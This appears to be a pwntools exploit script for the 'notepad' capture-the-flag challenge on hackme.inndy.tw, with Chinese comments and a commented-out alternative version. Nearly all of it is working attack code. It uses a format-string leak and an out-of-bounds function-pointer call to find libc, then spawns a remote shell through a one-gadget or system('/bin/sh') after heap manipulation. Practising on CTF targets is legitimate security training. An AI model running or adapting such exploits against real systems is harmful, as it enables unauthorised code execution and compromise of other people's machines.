#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

localMAGIC = 0x3ac5c      #locallibc
remoteMAGIC = 0x3ac3e      #remotelibc   #libc6_2.23-0ubuntu3_i386.so

def debug(addr = '0x8048ce8'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

elf = ELF('./notepad')
printf_addr=elf.plt['printf']
print 'printf_addr:'+hex(printf_addr)
strncpy_addr=elf.plt['strncpy']
print 'strncpy_addr:'+hex(strncpy_addr)
printf_got_addr=elf.got['printf']
print 'printf_got_addr:'+hex(printf_got_addr)

#io = process('/home/h11p/hackme/notepad')
io = remote('hackme.inndy.tw', 7713)


payload1='a'*4+p32(printf_addr)+p32(strncpy_addr)+'a'*3

# debug()
io.recvuntil('::> ')
io.sendline('c')
io.recvuntil('::>')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send(payload1)

io.recvuntil('::> ')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send('a'*15)

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('edit (Y/n)')
io.sendline('y')
io.recvuntil('content > ')
io.sendline('%1067$p')
io.recvuntil('::> ')

io.sendline(p32(93)) #调用上一块内存中的str_cpy函数把0xfff2c9f4中的数据复制到0xfff2c9f0中去


io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('::> ')
io.sendline(p32(92)) #调用printf函数 
libc_start_main_247=io.recv().splitlines()[0]
libc_start_main=base_addr(libc_start_main_247,0xf7)
print "libc_start_main:"+hex(libc_start_main)

#local_libc_base=base_addr(libc_start_main_247,0x18637)
#print "libc_base:"+hex(local_libc_base)

remote_libc_base=base_addr(libc_start_main_247,0x18637)
print "libc_base:"+hex(remote_libc_base)


#MAGIC_addr=local_libc_base+localMAGIC
MAGIC_addr=remote_libc_base+remoteMAGIC
payload2=p32(MAGIC_addr)
print "MAGIC_addr:"+hex(MAGIC_addr)
#io.recv()
io.sendline('b')
io.recvuntil('id > ')
io.sendline('0')
io.recvuntil('edit (Y/n)')
io.sendline('Y')
io.recvuntil('content > ')
io.sendline(payload2)
io.recvuntil('::> ')
io.sendline('a')

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('::> ')
io.sendline(p32(91))

io.interactive()



# 先new 4个small bin，然后用这个漏洞free掉第三个堆，再用它给的delete note来free掉第二个堆

# 这个时候两个堆就合并了

# 再new 一个两个堆合并后大小的堆

# 这个时候就能随便改第三个堆的内容了

# 然后用格式化字符串漏洞来泄漏libc地址

# 求出system的地址，再把第三个堆的开头设为/bin/sh，调用system(‘/bin/sh’) 成功get shell




# from pwn import *
# import time

# debug=0

# context.log_level='debug'

# if debug:
#     p=process('./notepad')
#     e=ELF('/lib/i386-linux-gnu/libc.so.6')
#     #gdb.attach(proc.pidof(p)[0])
#     #raw_input()
# else:
#     p=remote('hackme.inndy.tw', 7713)
#     e=ELF('./libc-2.23.so.i386')


# p.recvuntil('exit\n::> ')
# p.sendline('c')
# p.recvuntil('::> ')

# def new_note(size,content):
#     p.sendline('a')
#     p.recvuntil('size > ')
#     p.sendline(str(size))
#     p.recvuntil('data > ')
#     p.sendline(content)
#     p.recvuntil('::> ')

# def open_note(index,fun_index,content=''):
#     p.sendline('b')
#     p.recvuntil('id > ')
#     p.sendline(str(index))
#     p.recvuntil('(Y/n)')
#     if len(content)!=0:
#         p.sendline('y')
#         p.recvuntil('content > ')
#         p.sendline(content)
#     else:
#         p.sendline('n')
#     p.recvuntil('b> destory note\n::> ')
#     p.sendline(chr(fun_index+97))
#     leave_msg='note closed'
#     data=p.recvuntil(leave_msg)[:-len(leave_msg)]
#     p.recvuntil('::> ')
#     return data

# def delete_note(index):
#     p.sendline('c')
#     p.recvuntil('id > ')
#     p.sendline(str(index))
#     p.recvuntil('::> ')

# printf_got=0x0804B00C
# printf_plt=0x8048506
# free_plt=0x8048510
# put_plt=0x08048570
# pebp=0x80492AB

# new_note(60,'123')
# new_note(60,'123')
# new_note(60,'123')
# new_note(60,'123')

# open_note(1,0,'a'*52+p32(free_plt)+p32(put_plt))
# open_note(2,-3)
# delete_note(1)
# new_note(136,'123')

# open_note(1,0,p32(printf_got)+'a'*52+p32(printf_plt)*2+'AAAA'+'%11$s')
# printf_libc=open_note(2,-2)[4:8]

# import struct

# printf_libc=struct.unpack('<L',printf_libc)[0]

# base=printf_libc-e.symbols['printf']

# system=base+e.symbols['system']

# open_note(1,0,'a'*56+p32(system)*2+'/bin/sh\x00')

# p.sendline('b')
# p.recvuntil('id > ')
# p.sendline(str(2))

# p.interactive()